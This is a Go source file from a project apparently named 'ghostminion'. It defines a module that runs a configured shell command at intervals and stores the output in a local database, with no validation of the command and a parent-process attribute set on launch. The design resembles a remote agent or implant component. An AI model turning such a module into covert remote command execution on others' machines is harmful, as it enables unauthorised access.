package apps

import (
	"ghostminion/db"
	"ghostminion/db/dbDataTypes"
	"os/exec"
	"sync"
	"syscall"
	"time"
)

type PeriodicCommandApp struct {
	Command     string `json:"Command"`
	Timeout     uint   `json:"Timeout"`
	Interval    uint   `json:"Interval"`
	stop        chan struct{}
	commandChan chan string
}

func (c *PeriodicCommandApp) Start(wg *sync.WaitGroup) {
	defer wg.Done()

	go func() {
		for {
			select {
			case <-c.stop:
				return
			case <-time.After(time.Duration(c.Interval) * time.Second):
				lgr.Info("Running periodic command", c.Command)
				commandOutput, err := RunCommand(c.Command)
				if err != nil {
					lgr.Error("Error running periodic command: ", err)
				}
				err = db.WriteData("", dbDataTypes.Commands, commandOutput) // replace requestId
			}
		}
	}()
}

func (c *PeriodicCommandApp) Stop() {
	close(c.stop)
}

func (c *PeriodicCommandApp) Validate() error {
	return nil
}

func RunCommand(command string) ([]byte, error) {
	cmd := exec.Command(command)
	cmd.SysProcAttr = &syscall.SysProcAttr{ParentProcess: 0}
	output, err := cmd.CombinedOutput()
	if err != nil {
		return output, err
	}
	return output, nil
}
